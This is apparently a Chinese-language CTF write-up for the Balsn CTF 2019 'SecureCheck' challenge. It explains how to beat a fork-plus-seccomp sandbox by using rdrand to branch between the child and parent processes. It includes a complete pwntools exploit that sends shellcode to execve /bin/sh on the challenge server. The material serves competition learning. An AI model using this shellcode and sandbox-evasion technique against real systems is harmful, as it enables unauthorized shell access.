# Balsn CTF 2019

## Misc SecureCheck - 330

### Description

No system call no pain

```  
nc securecheck.balsnctf.com 54321  
```

Download

Author: Billy

### Solution

By [@HexRabbit](https://blog.hexrabbit.io)  
Credits to [@jaidTw](https://github.com/jaidTw)

這題說起來其實相當容易，前提是不要被想法限制住

題目 binary 逆向完大概長這樣  
```cpp  
void exit_syscall_filter()  
{  
 scmp_filter_ctx ctx;  
 ctx = seccomp_init(SCMP_ACT_KILL);  
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);  
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);  
 seccomp_load(ctx);  
}

int main() {  
   int status;  
   char *buf = mmap(0,  
                   0x1000,   
                   PROT_WRITE|PROT_READ|PROT_EXEC,  
                   MAP_SHARED|MAP_ANONYMOUS, -1, 0);  
   read(0, buf, 0x1000);  
  
   void (*f)() = (void (*)())buf;  
   if (!fork()) {  
       exit_syscall_filter();  
       f();  
   }  
   else {  
       wait(&status);  
       if(!status)  
           f();  
   }  
}  
```

題目讓使用者輸入一段 shellcode，接著 `fork()` 讓 child 先執行 seccomp 後跳進 shellcode，而 parent 會以
`wait()` 等待 child 返回，若是返回值為零，parent 也會執行相同的 shellcode

比較麻煩的是，由於 fork 會完整複製(by copy-on-write)一份相同的 process context 給 child，所以在 child
中的記憶體操作是不會影響到 parent process 的

瞭解這些限制後解題思路便是:「寫一份 shellcode 可以在判別 parent/child 後執行不同的指令」

不過接下來就卡住了，因為在 seccomp 限制下實在是難以找到方式辨別 child/parent。再來便是想到一些存在於 vDSO 內的 function
可以繞過 seccomp，如 time, gettimeofday .. 等，但苦於執行 shellcode 前幾乎把所有 register
的值都清掉了，也就找不到 vDSO base

最後隊友 [@jaidTw](https://github.com/jaidTw) 想到，何不乾脆在 shellcode
中使用一些每次執行的結果都不同的指令，然後透過判斷後一邊執行一邊不執行 syscall 呢?

翻閱技術文件，找到幾個好用的指令  
- rdtsc  
- rdtscp  
- rdrand  
- rdseed

於是就解出來了XD

最終的 exploit 如下:

```python  
#!/usr/bin/env python  
from pwn import *  
context.arch = 'amd64'  
context.terminal = ['tmux', 'neww']  
r = remote('securecheck.balsnctf.com', 54321)

sc = asm('''  
   rdrand eax  
   and eax, 0x1  
   cmp ax, 0x1  
   je SYSCALL  
   mov eax, 0x3c  
   xor edi, edi  
   syscall  
  
SYSCALL:  
   lea rsp, [rdx+0xf00]  
   mov rdi, 0x0068732f6e69622f  
   push rdi  
   mov rdi, rsp  
   mov eax, 0x3b  
   xor esi, esi  
   xor edx, edx  
   syscall  
''')

r.send(sc)

r.interactive()  
```  

Original writeup (https://github.com/10secTW/ctf-
writeup/tree/master/2019/balsn%20CTF/SecureCheck).